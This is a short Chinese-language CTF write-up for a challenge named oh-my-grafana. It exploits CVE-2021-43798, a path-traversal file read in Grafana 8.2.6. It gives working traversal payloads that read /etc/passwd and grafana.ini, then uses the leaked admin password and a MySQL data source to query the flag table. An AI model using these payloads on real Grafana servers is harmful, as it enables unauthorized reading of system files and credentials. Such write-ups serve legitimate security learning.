# oh-my-grafana-ZH

根据`CVE-2021-43798` 8.2.6版本的grafana存在未鉴权状态下的任意文件读取，使用POC

```
/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd
```
可以证明漏洞存在，可以读取题目环境的文件信息，利用如下POC可以读取grafana的配置文件信息

```
/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini
```

其中有两处信息比较可疑

```
# default admin user, created on startup
admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = 5f989714e132c9b04d4807dafeb10ade


# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = mysql
;host = mysql:3306
;name = grafana
;user = grafana
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password = grafana
```

设置了admin的访问密码，利用密码`5f989714e132c9b04d4807dafeb10ade`可以登录后台；同时发现有一组mysql的登录密码信息，利用`Configuration`里的`Data sources`功能，指定加载远程MySQL数据服务，通过执行SQL语句读取表信息和列信息，最后读出flag。

```
select flag from fffffflllllllllaaaagggggg
```